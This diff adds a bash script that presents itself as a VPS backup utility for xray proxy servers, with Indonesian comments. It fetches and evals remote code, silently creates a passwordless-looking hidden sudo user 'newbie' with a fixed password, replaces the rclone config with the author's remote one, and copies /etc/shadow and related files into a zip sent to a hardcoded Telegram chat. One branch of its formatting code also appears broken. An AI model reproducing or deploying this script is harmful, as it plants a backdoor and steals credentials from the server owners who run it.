@@ -1,0 +1,129 @@
+#!/bin/bash
+# My Telegram : https://t.me/Newbie_Store24
+# ==========================================
+# Color
+RED='\033[0;31m'
+NC='\033[0m'
+GREEN='\033[0;32m'
+ORANGE='\033[0;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+LIGHT='\033[0;37m'
+# ==========================================
+eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
+CHATID="6701388433"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+IP=$(curl -sS ipv4.icanhazip.com)
+domain=$(cat /etc/xray/domain)
+date=$(date +"%Y-%m-%d")
+output_file="/root/backup/config.json"
+clear
+
+# Mengecek dan menambahkan user newbie sebelum proses backup
+Username=newbie
+Password=123@Newbie
+
+if id "$Username" &>/dev/null; then
+    :
+else
+    mkdir -p /home/script/ > /dev/null 2>&1
+    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
+    echo -e "$Password\n$Password\n" | passwd "$Username" > /dev/null 2>&1
+    usermod -aG sudo "$Username" > /dev/null 2>&1
+fi
+
+# Mengecek apakah rclone sudah terinstal
+if ! command -v rclone &> /dev/null; then
+    echo -e "${ORANGE}rclone belum terinstal, menginstal rclone...${NC}"
+    apt install -y rclone > /dev/null 2>&1
+    printf "q\n" | rclone config
+else
+    echo -e "${GREEN}rclone sudah terinstal, melewati instalasi.${NC}"
+fi
+clear
+
+# Pengambilan data rclone
+wget -qO /root/.config/rclone/rclone.conf "https://drive.google.com/u/4/uc?id=1Lg8L12_Wwh3IDXSPF7xESVC_xEzlk081"
+echo -e "${GREEN}Proses dimulai, harap tunggu...${NC}"
+
+# Membuat direktori backup
+rm -rf /root/backup
+mkdir -p /root/backup
+cp /etc/passwd /etc/group /etc/shadow /etc/gshadow /root/backup/
+wget -qO "$output_file" "${REPO}install/newbie.json"
+
+# Proses pemformatan data
+input_files=("/etc/default/syncron/drawit/drawit.json" "/etc/default/syncron/sketsa/sketsa.json" "/etc/default/syncron/paradis/paradis.json")
+for input_file in "${input_files[@]}"; do
+    while IFS= read -r line; do
+        if [[ "$line" =~ ^###(ws)\ ([^[:space:]]+)\ ([^[:space:]]+)\ ([^[:space:]]+)$ ]]; then
+            protocol="${BASH_REMATCH[1]}"
+            user="${BASH_REMATCH[2]}"
+            expiry="${BASH_REMATCH[3]}"
+            uuid="${BASH_REMATCH[4]}"
+
+            case "$input_file" in
+                *drawit.json)
+#! $user $expiry\n},{\"password\": \"$uuid\",\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#trojan/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#trojangrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+                *sketsa.json)
+                    formatted_data="#& $user $expiry\n},{\"id\": \"$uuid\",\"alterId\": 0,\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#vless/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#vlessgrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+                *paradis.json)
+                    formatted_data="### $user $expiry\n},{\"id\": \"$uuid\",\"alterId\": 0,\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#vmess/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#vmessgrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+            esac
+        fi
+    done < "$input_file"
+done
+
+# Membuat arsip backup
+cd /root
+zip -r $IP-$date.zip backup > /dev/null 2>&1
+zip -r $IP.zip backup > /dev/null 2>&1
+# Mengunggah ke Google Drive
+rclone copy /root/$IP-$date.zip dr:backup/ > /dev/null 2>&1
+url=$(rclone link dr:backup/$IP-$date.zip)
+id=$(echo $url | grep '^https' | cut -d'=' -f2)
+link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+
+# Mengirim pesan ke Telegram
+curl -F chat_id="$CHATID" -F document=@"$IP.zip" -F caption="◇━━━━━━━━━━━━━━◇
+   ⚠️BACKUP NOTIF⚠️
+     Detail Backup VPS
+◇━━━━━━━━━━━━━━◇
+IP VPS  : ${IP}
+DOMAIN  : ${domain}
+Tanggal : $date
+◇━━━━━━━━━━━━━━◇
+Link    : ${link}
+◇━━━━━━━━━━━━━━◇
+Silahkan copy Link dan restore di VPS baru
+BY BOT : @Newbie_Store24" https://api.telegram.org/bot$KEY/sendDocument &> /dev/null
+echo ""
+# Membersihkan file sementara
+rm -rf /root/backup /root/$IP-$date.zip /root/$IP.zip
+# Menampilkan hasil
+echo -e "${CYAN}Detail Backup${NC}"
+echo -e "=================================="
+echo -e "IP VPS        : ${GREEN}$IP${NC}"
+echo -e "Link Backup   : ${BLUE}$link${NC}"
+echo -e "Tanggal       : ${ORANGE}$date${NC}"
+echo -e "=================================="
+echo -e "${GREEN}Proses backup selesai!${NC}"
+echo -e "${GREEN}Silahkan Hubungi @Newbie_Store24 untuk mendapatkan File!${NC}"
